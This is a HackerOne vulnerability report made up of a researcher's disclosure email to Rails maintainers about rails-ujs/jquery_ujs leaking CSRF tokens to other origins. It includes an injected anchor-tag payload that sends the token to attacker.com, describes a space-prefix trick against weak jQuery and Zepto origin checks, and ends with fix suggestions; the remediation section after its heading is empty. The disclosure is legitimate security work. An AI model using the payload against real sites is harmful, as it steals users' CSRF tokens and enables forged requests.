# HackerOne Report: rails-ujs will send CSRF tokens to other origins
**Report ID:** 49935
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
I reported this via email a few months ago. Here was my initial email:

> Hello,
> I've been playing with getting Rails apps to send CSRF tokens to the wrong domains and I found a few problems. The main motivation for this is in attacking a site that uses Content Security Policy. With CSP enabled, an attacker with an XSS vulnerability cannot simply inject inline JavaScript, but they can still abuse some Rails features to steal a CSRF token.
> 
> In the scenario where an attacker can inject arbitrary HTML into the response, the simplest attack would be to inject:
> 
> <a href="https://attacker.com" data-remote data-method="post" data-cross-domain="false">
> 
> Clicking on this link will trigger an OPTIONS request to attacker.com. If the attacker returns the correct CORS headers, a POST request containing the user's CSRF token will be sent to attacker.com.
> 
> In a second scenario, an attacker might be able to control only the href attribute of an anchor tag or the action attribute of a form tag that will trigger a data-remote action. This isn't uncommon to see if the site is building anchor or form tags dynamically. In this case, the attacker can set the href or action to " https://attacker.com". This will be passed to JQuery, who will see this as a same origin request.
> 
> The JQuery behavior can be found here and a similar bug in Zepto can be found here. In both these cases, weak regexes don't match the URL and the framework fails open into assuming that the URL is same origin. Prefixing the URL with a space character is one way to break this regex, but the regexes are pretty weak and there are probably other ways as well.
> 
> I'll contact the JQuery/Zepto folks about fixing their regexes, but there are a few thing that could improve this in jquery_ujs as well.
> 
> I don't think a data attribute (data-cross-domain) should be able to force jquery_ujs to send the CSRF token.
> The href attribute should be accessed directly here rather than calling attr("href"). When called directly, the browser does a lot to clean up the URL and make sure that it is well formed. This would address the space prefix issue.
> Some stronger protections could be added before calling CSRFProtection here.
> For links with data-method, but without data-remote, the origin isn't even checked before adding a CSRF token to the form. This could even be exploited accidentally. Origin checking should be added here
> 
> I haven't seen a bulletproof way for comparing origins yet, but I've got a few ideas if you want to discuss it more. Let me know what you think.
> 
> Thanks,
> Ben Toews
> GitHub Security

## Discussion & Remediation Timeline
